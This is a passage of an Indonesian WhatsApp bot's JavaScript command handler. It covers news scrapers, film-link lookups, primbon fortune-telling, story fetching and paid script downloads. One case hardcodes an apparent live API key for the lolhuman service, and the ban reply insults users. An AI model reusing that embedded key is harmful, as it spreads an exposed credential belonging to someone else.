fs.writeFileSync('./database/enable/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await slime.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
slime.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di group ini, siapa yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiWame) return m.reply('_Sudah Dimatikan_')
let off = ntwame.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/enable/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses matikan ${command} di group ini_`)
}
}
break
case 'fajar':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'cnn':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'layarkaca':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
reply(teks) 
})
break
//=================================================//
case 'cnbc':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'tribun':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'indozone':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'kompas':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'detik':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'daily':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'inews':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'sindo':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'antara':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "kontan":
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "merdeka":
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
slime.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "jalantikus":
await loading()
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
slime.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break
//=================================================
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} SlimexTzy, 7, 7, 2003, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} SlimexTzy`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} SlimexTzy, 7, 7, 2003`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} SlimexTzy|Putri`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} SlimexTzy, 1, 2020\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} SlimexTzy, 7, 7, 2003, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'weton': case 'wetonjawa': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
}
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} SlimexTzy, 7, 7, 2003`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'keberuntungan': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} SlimexTzy, 7, 7, 2003`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
}
break
//=================================================//
case 'memancing': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'masasubur': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return m.reply(anu.message)
 slime.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================
case 'cerpen':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=06e2ad993927b9c0779dfd31`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
break
//=================================================
case 'ceritahoror':
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
var caption = `Title : ${data.result.title}\n`
caption += `Desc : ${data.result.desc}\n`
caption += `Story :\n${data.result.story}\n`
slime.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
break
//=================================================
                case 'buysc1': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/cku38uri67q16ov/Free1.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc2': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/zm56k87hqst54cq/Free2.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc3': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/f4a7sxq6lmdhpwd/Free3.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc4': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/n0d2o3u98q0anw9/Free4.zip/file')
slime.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
                case 'buysc5': {
if (cekSaldo(sender,db_saldo) < 4000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await slime.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 4000, db_saldo)
